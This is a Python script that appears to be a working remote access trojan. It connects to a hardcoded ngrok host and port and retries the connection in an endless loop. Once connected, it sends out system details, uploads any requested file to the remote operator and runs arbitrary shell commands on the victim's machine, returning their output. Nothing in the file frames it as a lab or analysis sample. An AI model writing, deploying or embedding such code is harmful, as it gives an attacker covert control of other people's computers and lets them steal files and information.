host = '0.tcp.ngrok.io'
port = 19285

#!/usr/bin/env python
# ---------- LIBRARIES ---------- #
# Global (System)
import time
import socket
import subprocess
import os
import shutil

from sys import *
from os import remove
import json
import platform
import pathlib
import base64

class CommandHandler():
    def connectionCheck(self) -> str:
        return str.encode("connection working")

    def sysinfo(self) -> json:
        try:
            data = {}
            data['platform'] = platform.system()
            data['platform-release'] = platform.release()
            data['platform-version'] = platform.version()
            data['architecture'] = platform.machine()
            data['hostname'] = socket.gethostname()
            data['ip-address'] = socket.gethostbyname(socket.gethostname())
            data['processor'] = platform.processor()
            data = json.dumps(data)
            return data
        except:
            return 'Error Getting Sysinfo'

    def shell(self, command: str, conn: socket.socket):
        if command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
                conn.send(str.encode(os.getcwd()))
            except:
                conn.send(str.encode('Error Changing Directory'))
        elif command[:9] == 'filesize ':
            try:
                size = os.path.getsize(command[9:])
                conn.send(str.encode(f'The File Size is {size} bytes'))
            except:
                conn.send(str.encode('Error Getting File Size'))
        elif command[:9] == 'download ':
            try:
                conn.send(str.encode('Ready'))
                buffSize = int(conn.recv(1024).decode())
                with open(command[9:], 'rb') as f:
                    data = f.read()
                    for i in range(len(data)//buffSize):
                        conn.send(data[0:buffSize])
                        print(data[0:buffSize])
                        data = data[buffSize:]
                        conn.recv(1024)
                    conn.send(data)

            except IsADirectoryError:
                conn.send(str.encode('[-] Cannot Save a Directory'))
            except FileNotFoundError:
                conn.send(str.encode('[-] File Not Found'))
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            if result.decode() != "":
                conn.send(result)
            else:
                conn.send(str.encode("Done. No Output"))

class Client(CommandHandler):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.sock.connect((host, port))
                self.commandHandler()
                self.sock.close()
            except:
                continue

    def commandHandler(self):
        while True:
            data = self.sock.recv(1024)
            print(data)
            if data.decode() == 'connection check':
                self.sock.send(self.connectionCheck())
            elif data.decode() == 'sysinfo':
                data = self.sysinfo()
                self.sock.send(data.encode())
            elif data.decode() == 'shell':
                while True:
                    data = self.sock.recv(1024)
                    print(f"[Shell]: {data.decode()}")
                    if data.decode() == 'exit':
                        break
                    self.shell(data.decode(), self.sock)

def main():
    Client()

if __name__ == '__main__':
    main()